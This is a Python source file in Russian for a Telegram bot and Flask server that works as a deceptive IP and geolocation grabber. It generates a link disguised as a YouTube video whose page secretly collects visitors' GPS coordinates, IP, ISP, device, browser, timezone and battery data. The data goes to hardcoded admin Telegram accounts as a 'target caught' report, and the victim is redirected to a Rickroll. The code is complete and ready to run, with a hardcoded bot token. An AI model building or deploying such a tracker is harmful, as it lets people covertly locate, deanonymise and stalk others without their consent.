import telebot
import subprocess
import threading
import re
import requests
from flask import Flask, request, redirect, render_template_string
from user_agents import parse

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9261630231:AAF79ElOFMOG-1VgS1sMAncLhVp1kTlv_is" 
ADMIN_IDS = [7969267809, 8975587652] # Твои ID
# ============================================

telebot.apihelper.API_URL = "https://hyrepgram.tuma74600.workers.dev/bot{0}/{1}"
bot = telebot.TeleBot(BOT_TOKEN)

app = Flask(__name__)
CURRENT_LINK = "Генерация..."

TRAP_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Загрузка...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background-color: #000; color: #fff; text-align: center; padding-top: 20%; font-family: sans-serif;">
    <h2>Инициализация плеера...</h2>
    <p>Пожалуйста, подождите.</p>
    <script>
        let screen_info = window.screen.width + "x" + window.screen.height;
        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let language = navigator.language;
        
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
                        () => resolve({lat: null, lon: null}),
                        {timeout: 5000}
                    );
                } else { resolve({lat: null, lon: null}); }
            });
        }

        function getBattery() {
            return new Promise((resolve) => {
                if (navigator.getBattery) {
                    navigator.getBattery().then(b => resolve({level: Math.round(b.level*100), charging: b.charging}));
                } else { resolve({level: null, charging: null}); }
            });
        }

        Promise.all([getLocation(), getBattery()]).then(([loc, bat]) => {
            fetch('/log_data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({screen: screen_info, tz: timezone, lang: language, lat: loc.lat, lon: loc.lon, battery: bat})
            }).then(() => {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            });
        });
    </script>
</body>
</html>
"""

@app.route('/watch')
def track():
    return TRAP_HTML

@app.route('/log_data', methods=['POST'])
def log_data():
    ip = request.remote_addr
    ua_string = request.headers.get('User-Agent', 'Unknown')
    data = request.json
    screen = data.get('screen', 'Неизвестно')
    tz = data.get('tz', 'Неизвестно')
    lang = data.get('lang', 'Неизвестно')
    lat = data.get('lat')
    lon = data.get('lon')
    battery = data.get('battery', {})

    ua = parse(ua_string)
    device_type = "📱 Телефон" if ua.is_mobile else "💻 ПК" if ua.is_pc else "📟 Другое"
    os_info = f"{ua.os.family} {ua.os.version_string}"
    browser_info = f"{ua.browser.family} {ua.browser.version_string}"

    city, country, isp, is_vpn = "Неизвестно", "Неизвестно", "Неизвестно", "Неизвестно"
    try:
        geo_req = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,proxy,hosting&lang=ru", timeout=3).json()
        if geo_req.get('status') == 'success':
            country = geo_req.get('country', '?')
            city = geo_req.get('city', '?')
            isp = geo_req.get('isp', '?')
            is_vpn = "🔴 Да" if geo_req.get('proxy') or geo_req.get('hosting') else "🟢 Нет"
    except: pass

    geo_text = f"📍 **GPS:** {lat}, {lon}" if lat and lon else "📍 **GPS:** Доступ запрещен"
    battery_text = f"🔋 **Батарея:** {battery.get('level', '?')}% ({'Заряжается' if battery.get('charging') else 'Разряжается'})" if battery.get('level') is not None else "🔋 **Батарея:** Неизвестно"

    report = (
        f"🎯 **ЦЕЛЬ ПОЙМАНА!**\n\n"
        f"🌐 **IP:** `{ip}`\n"
        f"🌍 **Локация:** {city}, {country}\n"
        f"🏢 **Провайдер:** {isp}\n"
        f"🛡 **VPN/Proxy:** {is_vpn}\n\n"
        f"📱 **Устройство:** {device_type}\n"
        f"🖥 **Экран:** {screen}\n"
        f"⚙️ **ОС:** {os_info}\n"
        f"🌐 **Браузер:** {browser_info}\n"
        f"🕒 **Часовой пояс:** {tz}\n"
        f"🗣 **Язык:** {lang}\n"
        f"{battery_text}\n"
        f"{geo_text}"
    )

    for admin_id in ADMIN_IDS:
        try: bot.send_message(admin_id, report, parse_mode="Markdown")
        except: pass

    return {"status": "ok"}

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def start_tunnel():
    global CURRENT_LINK
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            CURRENT_LINK = match.group(0) + "/watch"
            print(f"✅ Ссылка готова: {CURRENT_LINK}")
            break

def check_access(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "⛔ Доступ запрещен.")
        return False
    return True

@bot.message_handler(commands=['start'])
def start(message):
    if not check_access(message): return
    bot.send_message(message.chat.id, "🕵️‍♂️ Напиши `/link`, чтобы получить продвинутую ссылку.")

@bot.message_handler(commands=['link'])
def get_link(message):
    if not check_access(message): return
    if "trycloudflare" in CURRENT_LINK:
        fake_text = "https://youtube.com/watch?v=funny_cat_video"
        bot.send_message(message.chat.id, f"Смотри какой прикол нашел: [{fake_text}]({CURRENT_LINK})", parse_mode="Markdown", disable_web_page_preview=True)
    else:
        bot.send_message(message.chat.id, "⏳ Генерирую ссылку...")

@bot.message_handler(func=lambda message: True)
def block_strangers(message):
    if not check_access(message): return

if __name__ == '__main__':
    
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=start_tunnel, daemon=True).start()
    print("Ловушка запущена...")
    bot.polling(non_stop=True)

